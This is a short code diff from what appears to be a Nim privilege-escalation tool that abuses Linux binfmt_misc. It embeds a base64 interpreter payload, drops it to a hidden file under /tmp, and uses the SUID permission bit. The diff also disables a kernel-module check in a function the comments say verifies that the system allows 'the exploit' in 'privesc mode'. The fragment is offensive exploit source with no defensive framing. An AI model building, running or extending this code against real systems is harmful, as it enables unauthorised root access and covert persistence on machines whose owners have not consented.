@@ -19,7 +19,7 @@ const SUID_PERM = 0o4000
 const EXEC_PERM = 0o100
 
 const INTERPRETER_PATH: string = "/tmp/.6wwMkxWeWd"
-const INTERPRETER_CONTENT {.strdefine.}: string = ""
+const INTERPRETER_CONTENT : string = slurp"../bin/interpreter.b64" #staticRead 
 
 proc checkBinfmt(privesc:bool):bool=
   ## Different checks to verify that the binfmt config allow the exploit
@@ -29,9 +29,9 @@ proc checkBinfmt(privesc:bool):bool=
   ## - check if the register file is writable by user if privesc mode
   
   # search module in boot config files
-  let moduleExist = execCmdEx("grep 'BINFMT_MISC' /boot/config-`uname -r`").exitCode
-  if moduleExist != 1:
-    styledEcho("⚠️ Do not find ",fgYellow,"BINFMT_MISC module ",fgWhite,"in /boot/config directory")
+  # let moduleExist = execCmdEx("grep 'BINFMT_MISC' /boot/config-`uname -r`").exitCode
+  # if moduleExist != 1:
+  #   styledEcho("⚠️ Do not find ",fgYellow,"BINFMT_MISC module ",fgWhite,"in /boot/config directory")
   
   # is mount?
   let isMount = execCmdEx("mount | grep binfmt_misc")
